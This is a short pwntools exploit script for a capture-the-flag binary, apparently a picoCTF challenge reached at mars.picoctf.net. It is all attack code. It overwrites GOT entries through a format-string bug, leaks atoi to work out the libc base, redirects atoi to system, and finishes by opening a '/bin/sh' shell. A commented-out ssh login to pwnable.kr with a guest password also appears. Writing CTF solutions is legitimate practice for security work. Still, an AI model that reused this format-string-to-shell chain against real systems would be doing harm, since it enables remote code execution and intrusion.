#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./chall", checksec = False)
libc = ELF("./libc6_2.31-0ubuntu7_amd64.so", checksec = False)

#con = process()
#gdb.attach(con, gdbscript = "start")

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("mars.picoctf.net", 31929)

input()
payload = b"1AAAAAAA" + fmtstr_payload(11, {elf.got['pow'] : elf.sym['main']}, numbwritten = 27)
con.sendline(payload)
con.sendline(b"1")

input()
con.sendline(b'1___%43$s')
con.sendline(b"1_______" + p64(elf.got['atoi']))
con.recvuntil(b'A: 1___')
atoi = u64(con.recv(6) + b"\0\0")
log.info("Atoi: " + hex(atoi))

libc.address = atoi - libc.sym['atoi']
log.info("Base: " + hex(libc.address))


input()
payload = b"1AAAAAAA" + fmtstr_payload(11, {elf.got['atoi'] : libc.sym['system']}, numbwritten = 27)
con.sendline(payload)
con.sendline(b"1")

input()
con.sendline(b"/bin/sh")
con.sendline(b"whatever")

con.interactive()
